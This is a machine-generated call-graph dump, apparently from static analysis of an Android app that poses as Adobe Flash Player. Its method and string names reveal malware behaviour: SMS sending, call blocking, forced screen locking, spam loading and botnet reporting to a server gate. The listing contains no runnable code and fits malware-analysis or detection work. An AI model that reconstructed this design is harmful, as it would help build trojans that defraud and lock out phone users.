VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>($r21, r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendSMS(java.lang.String,java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&h=") in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r1 = virtualinvoke $r1.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("Ha-ha!") in <com.adobe.flashplayer_.MacrosStat: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke r3.<java.io.File: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: java.lang.String toString()>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("callBlock[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(";") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r19 = specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotNetwork", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r3.<java.io.BufferedReader: java.lang.String readLine()>() in <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: java.lang.String readLine()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("forcelock", "LOCKED", $r38) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r1 = virtualinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: java.lang.Object getSystemService(java.lang.String)>("connectivity") in <com.adobe.flashplayer_.AdobeFlashCore: boolean isOnline()> ==> <android.content.ContextWrapper: java.lang.Object getSystemService(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.flashplayer_.Prefs: void stopSelf()>() in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <android.app.Service: void stopSelf()>
SPECIAL edge: specialinvoke r4.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r6) in <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
STATIC edge: r30 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r30) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r14.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.FlashW: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotPhone") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $z1 = virtualinvoke $r21.<java.lang.String: boolean equals(java.lang.Object)>("On") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<com.adobe.packages.BK: void <init>()>() in <dummyMainClass: com.adobe.packages.BK dummyMainMethod_com_adobe_packages_BK(android.content.Intent)> ==> <com.adobe.packages.BK: void <init>()>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&f=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\n") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r0.<com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)>(null) in <dummyMainClass: com.adobe.flashplayer.Certificate dummyMainMethod_com_adobe_flashplayer_Certificate(android.content.Intent)> ==> <com.adobe.flashplayer.Certificate: void onCreate(android.os.Bundle)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("&b=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("MacrosAData", "User haven\'t accounts.", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>("c", $r20, $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void writeConfig(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke $r53.<java.lang.StringBuilder: void <init>(java.lang.String)>("sendSMS[") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>("BotPhone", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "loadSpam[OK]:Executed:HTTP", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotPhone") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
STATIC edge: r25 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
VIRTUAL edge: virtualinvoke r4.<java.io.OutputStreamWriter: void write(java.lang.String)>($r2) in <com.adobe.flashplayer_.FlashURL: void writeConfig(java.lang.String,java.lang.String,android.content.Context)> ==> <java.io.Writer: void write(java.lang.String)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.AdobeUtil dummyMainMethod_com_adobe_flashplayer___AdobeUtil(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.AdobeUtil dummyMainMethod_com_adobe_flashplayer___AdobeUtil(android.content.Intent)>
SPECIAL edge: specialinvoke r0.<java.lang.Exception: void <init>()>() in <java.lang.RuntimeException: void <init>(java.lang.String)> ==> <java.lang.Exception: void <init>()>
SPECIAL edge: specialinvoke $r52.<com.adobe.flashplayer_.FlashVars: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVars: void <init>()>
VIRTUAL edge: $r1 = virtualinvoke r4.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeFlashCore: java.lang.String readConfig(java.lang.String)> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>("a_link", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>(r2) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.Object)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r22.<java.lang.StringBuilder: void <init>(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r22 = virtualinvoke r19.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&c=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("]") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r2) in <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r15 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>("BotNetwork") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r30.<java.lang.String: boolean equals(java.lang.Object)>("mounted") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: boolean equals(java.lang.Object)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: virtualinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: android.os.AsyncTask execute(java.lang.Object[])>($r22) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <android.os.AsyncTask: android.os.AsyncTask execute(java.lang.Object[])>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r9, $r18, r4, $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("\r") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r3.<android.content.ComponentName: void <init>(android.content.Context,java.lang.Class)>(r0, class "Lcom/adobe/flashplayer_/ADOBEcoreZa;") in <com.adobe.flashplayer_.FlashARM: void onCreate(android.os.Bundle)> ==> <android.content.ComponentName: void <init>(android.content.Context,java.lang.Class)>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("|") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&g=") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r6 = specialinvoke r0.<com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)>("lockd", $r1) in <com.adobe.flashplayer_.Prefs: void <init>(android.content.Context,java.lang.String)> ==> <com.adobe.flashplayer_.Prefs: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&d=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r1.<android.content.Intent: void <init>(android.content.Context,java.lang.Class)>(r0, class "Lcom/adobe/flashplayer_/AdobeFlashCore;") in <com.adobe.flashplayer_.AdobeFlashCore: void onDestroy()> ==> <android.content.Intent: void <init>(android.content.Context,java.lang.Class)>
VIRTUAL edge: $r20 = virtualinvoke r4.<java.lang.StringBuffer: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuffer: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke $r56.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r57.<java.io.File: void <init>(java.io.File,java.lang.String)>($r35, $r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.io.File: void <init>(java.io.File,java.lang.String)>
SPECIAL edge: specialinvoke r4.<java.io.InputStreamReader: void <init>(java.io.InputStream)>($r6) in <com.adobe.flashplayer_.FlashY: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.InputStreamReader: void <init>(java.io.InputStream)>
SPECIAL edge: specialinvoke r0.<android.app.Service: void <init>()>() in <com.adobe.flashplayer_.AdobeFlashCore: void <init>()> ==> <android.app.Service: void <init>()>
VIRTUAL edge: $r20 = virtualinvoke $r15.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: $r5 = virtualinvoke $r7.<java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>(":", "") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String replace(java.lang.CharSequence,java.lang.CharSequence)>
VIRTUAL edge: r4 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: $r14 = virtualinvoke $r14.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("?") in <com.adobe.flashplayer_.FlashURL: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke r0.<android.os.CountDownTimer: void <init>(long,long)>($l0, $l1) in <com.adobe.flashplayer_.AdobeZCore$1: void <init>(com.adobe.flashplayer_.AdobeZCore,long,long)> ==> <android.os.CountDownTimer: void <init>(long,long)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r20) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
STATIC edge: staticinvoke <dummyMainClass: com.adobe.flashplayer_.AdobeZCore dummyMainMethod_com_adobe_flashplayer___AdobeZCore(android.content.Intent)>(null) in <dummyMainClass: void dummyMainMethod(java.lang.String[])> ==> <dummyMainClass: com.adobe.flashplayer_.AdobeZCore dummyMainMethod_com_adobe_flashplayer___AdobeZCore(android.content.Intent)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.FlashW dummyMainMethod_com_adobe_flashplayer___FlashW(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
VIRTUAL edge: $r24 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r18) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r54.<com.adobe.flashplayer_.FlashVirtual: void <init>()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.FlashVirtual: void <init>()>
STATIC edge: r25 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>(r25) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r1.<android.view.View: void <init>(android.content.Context)>(null) in <dummyMainClass: com.adobe.flashplayer_.MacrosStat dummyMainMethod_com_adobe_flashplayer___MacrosStat(android.content.Intent)> ==> <android.view.View: void <init>(android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>("BotVer", "5.3") in <com.adobe.flashplayer_.AdobeFlashCore: void onCreate()> ==> <com.adobe.flashplayer_.AdobeFlashCore: void writeConfig(java.lang.String,java.lang.String)>
SPECIAL edge: specialinvoke $r0.<java.lang.RuntimeException: void <init>(java.lang.String)>("Stub!") in <java.lang.String: java.lang.String valueOf(long)> ==> <java.lang.RuntimeException: void <init>(java.lang.String)>
VIRTUAL edge: $r2 = virtualinvoke $r0.<com.adobe.flashplayer_.AdobeZCore: android.os.IBinder onBind(android.content.Intent)>(null) in <dummyMainClass: com.adobe.flashplayer_.AdobeZCore dummyMainMethod_com_adobe_flashplayer___AdobeZCore(android.content.Intent)> ==> <com.adobe.flashplayer_.AdobeZCore: android.os.IBinder onBind(android.content.Intent)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r3) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r16 = virtualinvoke $r22.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(".txt") in <com.adobe.flashplayer_.FlashZ: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: $r20 = specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>("Reich_ServerGate", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: java.lang.String readConfig(java.lang.String,android.content.Context)>
VIRTUAL edge: $r23 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(":Executed:HTTP") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $r23 = virtualinvoke $r53.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r14) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>("sendSMS[") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: $r20 = virtualinvoke $r23.<java.lang.StringBuilder: java.lang.String toString()>() in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.StringBuilder: java.lang.String toString()>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>(r4, "out.txt", $r1) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <com.adobe.flashplayer_.FlashURL: void saveData(java.lang.String,java.lang.String,android.content.Context)>
SPECIAL edge: specialinvoke r0.<com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>($r17, $r14, "faceLock[OK]:Executed", $r7) in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <com.adobe.flashplayer_.AdobeUtil: void sendREP(java.lang.String,java.lang.String,java.lang.String,android.content.Context)>
STATIC edge: r3 = staticinvoke <java.lang.String: java.lang.String valueOf(java.lang.Object)>($r23) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String valueOf(java.lang.Object)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>(r6) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>($r21) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
SPECIAL edge: specialinvoke $r0.<com.adobe.flashplayer_.FlashZ: void <init>()>() in <dummyMainClass: com.adobe.flashplayer_.FlashZ dummyMainMethod_com_adobe_flashplayer___FlashZ(android.content.Intent)> ==> <com.adobe.flashplayer_.FlashZ: void <init>()>
VIRTUAL edge: $r24 = virtualinvoke r8.<java.lang.String: java.lang.String[] split(java.lang.String)>(" ") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.String: java.lang.String[] split(java.lang.String)>
VIRTUAL edge: virtualinvoke r0.<com.adobe.packages.ZLocker: boolean requestWindowFeature(int)>(1) in <com.adobe.packages.ZLocker: void onCreate(android.os.Bundle)> ==> <android.app.Activity: boolean requestWindowFeature(int)>
VIRTUAL edge: r5 = virtualinvoke r5.<java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>("&e=") in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: java.lang.StringBuilder append(java.lang.String)>
VIRTUAL edge: $z0 = virtualinvoke r19.<java.lang.String: boolean contains(java.lang.CharSequence)>("On") in <com.adobe.flashplayer_.AdobeUtil: void onCreate()> ==> <java.lang.String: boolean contains(java.lang.CharSequence)>
SPECIAL edge: specialinvoke r3.<java.io.BufferedReader: void <init>(java.io.Reader)>(r4) in <com.adobe.flashplayer_.FlashZ: java.lang.String readConfig(java.lang.String,android.content.Context)> ==> <java.io.BufferedReader: void <init>(java.io.Reader)>
SPECIAL edge: specialinvoke $r56.<java.lang.StringBuilder: void <init>(java.lang.String)>(r4) in <com.adobe.flashplayer_.FlashURL: void onReceive(android.content.Context,android.content.Intent)> ==> <java.lang.StringBuilder: void <init>(java.lang.String)>
